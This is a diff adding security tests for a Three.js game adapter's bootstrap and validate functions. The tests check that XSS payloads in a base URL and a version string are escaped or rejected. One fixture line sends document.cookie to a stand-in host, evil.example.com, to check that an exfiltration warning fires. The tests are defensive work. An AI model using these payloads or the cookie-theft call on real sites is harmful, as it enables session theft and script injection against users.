@@ -62,6 +62,31 @@ describe('threeAdapter.bootstrap (gameplan §3 + §7.3)', () => {
     expect(html).toContain('window.__game.debug = window.__game.debug || {');
     expect(html).toContain('snapshot: function () { return null; }');
   });
+
+  it('#47 — neutralises quotes/angle-brackets in gameBaseUrl', () => {
+    const html = threeAdapter.bootstrap({
+      ...opts,
+      gameBaseUrl: 'https://evil.example.com/"><script>alert(1)</script>',
+    });
+    // The injected payload must not appear verbatim in the document.
+    expect(html).not.toContain('"><script>alert(1)</script>');
+    // The dangerous characters are HTML-escaped inside the attribute.
+    expect(html).toContain('&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;');
+  });
+
+  it('#47 — rejects javascript:/data: gameBaseUrl bases', () => {
+    expect(() => threeAdapter.bootstrap({ ...opts, gameBaseUrl: 'javascript:alert(1)' })).toThrow();
+    expect(() =>
+      threeAdapter.bootstrap({ ...opts, gameBaseUrl: 'data:text/html,<script>1</script>' }),
+    ).toThrow();
+  });
+
+  it('#47 — rejects a non-semver pinnedVersion', () => {
+    expect(() =>
+      threeAdapter.bootstrap({ ...opts, pinnedVersion: '0.170.0"/></script><script>x</script>' }),
+    ).toThrow();
+    expect(() => threeAdapter.bootstrap({ ...opts, pinnedVersion: 'latest' })).toThrow();
+  });
 });
 
 describe('threeAdapter.validate (gameplan §7.6)', () => {
@@ -164,6 +189,24 @@ describe('threeAdapter.validate (gameplan §7.6)', () => {
     expect(result.ok).toBe(false);
     if (result.ok) return;
     expect(result.issues.some((i) => i.message.includes('eval / new Function'))).toBe(true);
+  });
+
+  it('#41 — warns (not errors) when scene code references the network', () => {
+    const networky = `${goodMain}
+      fetch('https://evil.example.com/steal?d=' + document.cookie);
+    `;
+    const result = threeAdapter.validate([
+      { path: 'index.html', content: goodIndex },
+      { path: 'src/main.js', content: networky },
+    ]);
+    expect(result.ok).toBe(false);
+    if (result.ok) return;
+    const warn = result.issues.find((i) => i.message.includes('anti_exfil'));
+    expect(warn?.severity).toBe('warn');
+    // anti-exfil is advisory, not a hard failure: no error issue is added by it.
+    expect(result.issues.some((i) => i.severity === 'error' && i.message.includes('anti_exfil'))).toBe(
+      false,
+    );
   });
 
   it('warns when no input or resize listener is present', () => {
